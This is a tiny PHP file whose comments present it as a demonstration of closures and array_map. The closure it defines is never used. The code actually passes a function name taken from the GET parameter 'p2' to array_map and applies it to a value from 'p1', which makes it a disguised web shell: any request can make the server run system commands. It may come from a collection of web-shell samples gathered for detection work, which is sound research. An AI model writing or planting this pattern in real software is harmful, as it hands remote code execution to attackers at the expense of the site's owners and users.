<?php
// closure
$func = function($a) {
    echo $a;
};

$a = $_GET["p1"];
$b = $_GET["p2"];
$input = [$a,$a,$a];
//call the closure for each element in the array
array_map($b, $input);